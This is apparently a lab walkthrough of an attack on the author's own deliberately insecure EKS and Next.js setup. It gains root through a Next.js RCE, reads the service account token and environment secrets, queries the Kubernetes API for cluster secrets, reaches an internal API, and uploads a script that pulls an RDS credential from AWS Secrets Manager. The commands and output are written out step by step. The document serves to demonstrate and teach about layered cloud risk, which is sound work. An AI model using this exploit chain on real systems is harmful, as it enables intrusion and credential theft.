# reat2shell: Hacker Breach

[Back](../README.md)

- [reat2shell: Hacker Breach](#reat2shell-hacker-breach)
  - [Overview](#overview)
    - [Steps](#steps)
  - [Setup Environment](#setup-environment)
  - [Code Layer - Get react runtime info](#code-layer---get-react-runtime-info)
  - [Container Layer - Get sensitive data in container](#container-layer---get-sensitive-data-in-container)
    - [Container secret \& Service account token](#container-secret--service-account-token)
    - [Access API Server](#access-api-server)
  - [Cluster Layer - Get sensitive data in cluster](#cluster-layer---get-sensitive-data-in-cluster)
    - [Cluster secret](#cluster-secret)
    - [Access internal api](#access-internal-api)
  - [Cloud Layer - Get sensitive data in cloud](#cloud-layer---get-sensitive-data-in-cloud)
  - [Attack Chain Summary](#attack-chain-summary)

---

## Overview

- Perspective: Hacker
- Goal: show how a hacker exploits via `React2shell`
- Environment:
  - infra: eks-insecure
  - manifests: insecure-apps
- Url: `http://react2shell.arguswatcher.net:3000`

---

### Steps

| #   | Steps                           | Layers    | Milestone                                      |
| --- | ------------------------------- | --------- | ---------------------------------------------- |
| 0   | Setup EKS & app                 | -         | EKS cluster & React app                        |
| 1   | Get react runtime info          | code      | id, distro                                     |
| 2   | Get sensitive data in container | container | container secret & sa token & apiserver access |
| 3   | Get sensitive data in cluster   | cluster   | cluster secret, internal api                   |
| 4   | Get sensitive data in cloud     | cloud     | rds secret                                     |

---

## Setup Environment

- Environment:
  - infra: eks-insecure
  - manifests: insecure-apps

```sh
# provision eks cluster
terraform -chdir=infra/eks-insecure apply -auto-approve
aws eks update-kubeconfig --region ca-central-1 --name react2shell-eks-insecure

# deploy apps
kubectl apply -f argocd/insecure-root-app.yaml
# port forward
kubectl port-forward service/react2shell -n react 3000:3000

```

## Code Layer - Get react runtime info

```sh
VICTIM_URL="http://react2shell.arguswatcher.net:3000"

# try
python scripts/rce.py $VICTIM_URL id
# uid=0(root) gid=0(root) groups=0(root)

# get distro
python scripts/rce.py $VICTIM_URL "cat /etc/os-release"
# PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
# NAME="Debian GNU/Linux"
# VERSION_ID="12"
# VERSION="12 (bookworm)"
# VERSION_CODENAME=bookworm
# ID=debian
# HOME_URL="https://www.debian.org/"
# SUPPORT_URL="https://www.debian.org/support"
# BUG_REPORT_URL="https://bugs.debian.org/"
```

![code_id](./img/hacker/code_id.png)

![code_distro](./img/hacker/code_distro.png)

---

## Container Layer - Get sensitive data in container

### Container secret & Service account token

- Get container secret

```sh
# print all env var
python scripts/rce.py $VICTIM_URL "printenv"
# KUBERNETES_SERVICE_PORT=443
# KUBERNETES_PORT=tcp://172.20.0.1:443
# NEXT_PRIVATE_WORKER=1
# npm_config_user_agent=npm/10.8.2 node/v20.20.2 linux x64 workspaces/false
# NODE_VERSION=20.20.2
# ...

# get container secret
python scripts/rce.py $VICTIM_URL "printenv CONTAINER_SECRET"
# CoNtAinEr-sEcRet-InsECurE
```

- list printenv

![container_printenv](./img/hacker/container_printenv.png)

- retrieve **container secret**

![container_secret](./img/hacker/container_secret.png)

---

- Get service account token

```sh
# try service account
python scripts/rce.py $VICTIM_URL "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
# total 0
# lrwxrwxrwx. 1 root root 13 Oct 18 18:23 ca.crt -> ..data/ca.crt
# lrwxrwxrwx. 1 root root 16 Oct 18 18:23 namespace -> ..data/namespace
# lrwxrwxrwx. 1 root root 12 Oct 18 18:23 token -> ..data/token

# get namespace
python scripts/rce.py $VICTIM_URL "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
# react

# get service account token
python scripts/rce.py $VICTIM_URL "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
# eyJhbGciOiJSUzI1NiIsImtpZCI6ImF6c0RoVDZOX1JXS0hjXzAtYjBtbndIbHBlT1IwOE9rTzY1VDhkN1hkTWMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5l...
```

- Get service account token

![container_sa_token](./img/hacker/container_sa_token.png)

---

### Access API Server

```sh
# try request api
python scripts/rce.py $VICTIM_URL "curl -sS https://kubernetes.default.svc"
# curl: (77) error setting certificate file: /etc/ssl/certs/ca-certificates.crt

# request api
python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api'
# {
#   "kind": "APIVersions",
#   "versions": [
#     "v1"
#   ],
#   "serverAddressByClientCIDRs": [
#     {
#       "clientCIDR": "0.0.0.0/0",
#       "serverAddress": "ip-172-16-110-140.ca-central-1.compute.internal:443"
#     }
#   ]
# }
```

- Attemp to access apiserver

![container_apiserver](./img/hacker/container_apiserver.png)

---

## Cluster Layer - Get sensitive data in cluster

### Cluster secret

- Get cluster resources

```sh
# list namespace
python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces' | grep -iE "\"name\""
      #   "name": "argocd",
      #   "name": "default",
      #   "name": "internal",
      #   "name": "kube-node-lease",
      #   "name": "kube-public",
      #   "name": "kube-system",
      #   "name": "react",
```

---

- Get cluster secret

```sh
# list secret in internal namespace
python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets' | grep -E -A1 "\"name|\"data"
# --
#         "name": "cluster-secret",
#         "namespace": "internal",
#         "uid": "c67461e6-f7c8-4975-b29d-460b83617a09",
# --
#       "data": {
#         "password": "Y0x1U1Rlci1TZWNSZVQ="
# --
#         "name": "container-secret",
#         "namespace": "react",
#         "uid": "d6dd27a1-013d-45a8-9ab1-c45079b42153",
# --
#       "data": {
#         "password": "Q29OdEFpbkVyLXNFY1JldC1JbnNFQ3VyRQ=="

echo "Y0x1U1Rlci1TZWNSZVQ=" | base64 -d; echo
# cLuSTer-SecReT
```

- Get cluster secret

![cluster_secret](./img/hacker/cluster_secret.png)

---

### Access internal api

- An api application named `internal-api` is deployed within cluster only for internal use.

```sh
# list pods in internal ns
python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/internal/pods' | grep -E "\"name\"|\"image\"|\"containerPort\"|\"podIP\""
      #   "name": "internal-api-66cd54c558-849t6",
      #       "name": "nginx",
      #       "image": "nginx:alpine",
      #           "containerPort": 3000,
      #   "podIP": "10.0.59.72",

# request internal api
python scripts/rce.py $VICTIM_URL "curl -fsSL http://10.0.59.72:3000/api/v1/users"
# [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]
```

- Get internal-api ip and request

![cluster_internal_api](./img/hacker/cluster_internal_api.png)

---

## Cloud Layer - Get sensitive data in cloud

```sh
# ##############################
# Attack
# ##############################
# 1. detect IRSA — pod has an AWS identity
python scripts/rce.py $VICTIM_URL "env | grep AWS"
# AWS_ROLE_ARN=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
# AWS_STS_REGIONAL_ENDPOINTS=regional
# AWS_DEFAULT_REGION=ca-central-1
# AWS_REGION=ca-central-1

# get web id
python scripts/rce.py $VICTIM_URL "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
# eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...

# try aws CLI
python scripts/rce.py $VICTIM_URL "aws sts get-caller-identity"
# /bin/sh: 1: aws: not found

# 2. upload js script
b64=$(base64 -w0 scripts/steal_secret.js)
python scripts/rce.py $VICTIM_URL "echo $b64 | base64 -d > /tmp/s.js"

# 3. blast radius: the */* role lists secrets
python scripts/rce.py $VICTIM_URL "node /tmp/s.js --list"
# [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=list
# [*] assumed role, akid=ASIAROFJQB4XHT4N6TE3
# {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-OpaD9C","CreatedDate":1.792346971038E9,"Description":"RDS master credential (crown jewel).","LastAccessedDate":1.7922816E9,"LastChangedDate":1.792346971319E9,"Name":"react2shell-eks-insecure-rds-credential","SecretVersionsToStages":{"terraform-vwbKvGB3G9SfIqJLZ37Dc0w8qi":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"insecure"},{"Key":"ManagedBy","Value":"terraform"}]}]}

# 4. grab the crown jewel with Node built-ins only (no aws CLI/SDK).
# steal_secret.js:
# read IRSA token -> STS AssumeRoleWithWebIdentity -> Secrets Manager GetSecretValue
python scripts/rce.py $VICTIM_URL "node /tmp/s.js react2shell-eks-insecure-rds-credential"
# [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=get secret=react2shell-eks-insecure-rds-credential
# [*] assumed role, akid=ASIAROFJQB4XONBUMYLF
# {"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-OpaD9C","CreatedDate":1.792346971313E9,"Name":"react2shell-eks-insecure-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-vwbKvGB3G9SfIqJLZ37Dc0w8qi","VersionStages":["AWSCURRENT"]}
```

- Get AWS environment variables

![cloud_printenv_aws](./img/hacker/cloud_printenv_aws.png)

- Upload script and list AWS secrets.

![cloud_upload_list_secret](./img/hacker/cloud_upload_list_secret.png)

- Steal AWS RDS secret

![cloud_secret](./img/hacker/cloud_secret.png)

---

## Attack Chain Summary

| #   | Layer     | Vulnerability             | Exploit                    |
| --- | --------- | ------------------------- | -------------------------- |
| 1   | code      | Next.js (CVE-2025-55182)  | get root shell in pod      |
| 2   | container |                           | get container secret       |
| 3   | container | token auto-mounted in pod | access kube api with token |
| 4   | cluster   | flat network              | access api in internal ns  |
| 5   | cluster   | permissive RBAC           | get cluster secret         |
| 6   | cloud     | permissive IRSA           | get cloud secret           |
